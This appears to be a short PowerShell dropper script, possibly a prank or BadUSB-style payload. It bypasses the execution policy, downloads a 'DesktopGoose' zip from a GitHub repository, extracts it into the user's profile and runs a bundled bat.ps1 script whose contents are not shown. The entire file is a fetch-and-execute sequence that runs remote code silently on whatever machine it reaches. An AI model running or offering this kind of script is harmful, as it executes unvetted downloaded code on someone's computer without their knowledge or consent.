Set-ExecutionPolicy Bypass -Scope Process -Force
#$source = 'https://github.com/Giddow/sdgsdg/raw/main/Desktop%20Goose.zip'
#$destination = "$env:userprofile\Downloads\yeettt.zip"
Invoke-RestMethod -Uri 'https://github.com/Giddow/sdgsdg/raw/main/DesktopGoose.zip' -OutFile $env:userprofile\Downloads\goosi.zip
Expand-Archive "$env:userprofile\Downloads\goosi.zip" -DestinationPath $env:userprofile -Force
powershell "$env:userprofile\DesktopGoose\bat.ps1"
